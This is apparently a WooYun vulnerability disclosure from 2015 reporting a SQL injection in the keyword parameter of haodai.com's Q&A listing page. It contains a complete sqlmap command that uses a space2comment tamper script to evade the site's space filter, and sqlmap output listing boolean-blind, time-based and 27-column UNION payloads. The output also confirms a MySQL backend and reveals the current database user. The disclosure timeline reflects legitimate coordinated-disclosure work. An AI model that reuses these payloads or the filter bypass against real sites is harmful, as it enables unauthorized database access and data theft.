wybug_title: 好贷网注入绕过一枚(可union)
wybug_detail:
漏洞详情 披露状态：   									2015-10-26：	细节已通知厂商并且等待厂商处理中									2015-10-26：	厂商已经确认，细节仅向厂商公开									2015-11-05：	细节向核心白帽子及相关领域专家公开									2015-11-15：	细节向普通白帽子公开									2015-11-25：	细节向实习白帽子公开									2015-12-10：	细节向公众公开  简要描述： RT 详细说明：  漏洞地址：
http://www.haodai.com/wenda/listindex?keyword=a
keyowrd参数存在注入，空格被过滤了，可利用space2comment绕过
C:\sqlmap>sqlmap -u "http://www.haodai.com/wenda/listindex?keyword=a"  --tamper"space2comment"  --dbms mysql --level 5 --risk 3  --dbs

---Parameter: keyword (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: keyword=-8674') OR 5666=5666 AND ('wxUH'='wxUH    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: keyword=a') OR SLEEP(5) AND ('xDdn'='xDdn    Type: UNION query    Title: MySQL UNION query (NULL) - 27 columns    Payload: keyword=a') UNION ALL SELECT CONCAT(0x71766b7671,0x566858594a4e426f62434f447a424f4f4c59777542757046464775574b707276564263504a6e6177,0x716a706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#---
   漏洞证明：  


sqlmap resumed the following injection point(s) from stored session:---Parameter: keyword (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: keyword=-8674') OR 5666=5666 AND ('wxUH'='wxUH    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: keyword=a') OR SLEEP(5) AND ('xDdn'='xDdn    Type: UNION query    Title: MySQL UNION query (NULL) - 27 columns    Payload: keyword=a') UNION ALL SELECT CONCAT(0x71766b7671,0x566858594a4e426f62434f447a424f4f4c59777542757046464775574b707276564263504a6e6177,0x716a706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#---[13:13:56] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[13:13:56] [INFO] testing MySQL[13:13:58] [INFO] confirming MySQL[13:13:58] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[13:13:58] [INFO] fetching current usercurrent user:    'haodaiwang@192.168.1.%'
